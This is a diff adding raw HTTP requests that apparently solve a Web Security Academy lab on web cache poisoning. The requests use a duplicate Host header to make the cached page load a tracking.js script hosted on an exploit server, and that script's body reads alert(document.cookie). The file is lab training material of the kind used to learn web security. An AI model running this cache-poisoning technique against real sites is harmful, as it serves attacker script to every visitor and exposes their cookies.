@@ -1,0 +1,18 @@
+GET / HTTP/1.1
+Host: ac651f5e1ef0f7d6c0d03015004d00df.web-security-academy.net
+Host: abc.abc.com
+
+POST / HTTP/1.1
+Host: exploit-ac2e1fd01ecff70cc02e307c0176004c.web-security-academy.net
+
+urlIsHttps=on&responseFile=%2Fresources%2Fjs%2Ftracking.js&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+application%2Fjavascript%3B+charset%3Dutf-8&responseBody=alert%28document.cookie%29%3B&formAction=STORE
+
+GET /log HTTP/1.1
+Host: exploit-ac2e1fd01ecff70cc02e307c0176004c.web-security-academy.net
+
+GET / HTTP/1.1
+Host: ac651f5e1ef0f7d6c0d03015004d00df.web-security-academy.net
+Host: exploit-ac2e1fd01ecff70cc02e307c0176004c.web-security-academy.net
+
+GET /log HTTP/1.1
+Host: exploit-ac2e1fd01ecff70cc02e307c0176004c.web-security-academy.net
